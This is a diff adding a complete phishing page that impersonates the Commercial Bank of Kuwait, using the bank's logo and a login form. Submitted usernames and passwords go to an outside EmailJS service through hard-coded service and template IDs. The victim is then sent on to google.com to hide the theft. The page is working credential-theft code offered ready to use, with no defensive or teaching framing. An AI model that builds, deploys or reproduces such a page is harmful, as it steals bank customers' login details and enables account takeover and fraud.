@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        form {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        label {
+            margin-top: 10px;
+            display: block;
+            color: #666;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin-top: 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #004494;
+        }
+        img {
+            width: 100%;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+    </style>
+    <!-- Include the EmailJS library -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("-tlJNg7yKQb_7Hogk"); // Replace it with your user ID
+        })();
+    </script>
+</head>
+<body>
+    <form id="loginForm">
+        <img src="https://pg.cbk.com/instapay/Content/Images/CBK-Logo.png" alt="Commercial Bank of Kuwait">
+        <h1>Login to Your Account</h1>
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">Login</button>
+    </form>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            emailjs.send("service_p4iy4j7", "template_cmzfc5o", {
+                "username": username,
+                "password": password
+            }).then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                window.location.href = 'https://www.google.com';
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+        });
+    </script>
+</body>
+</html>
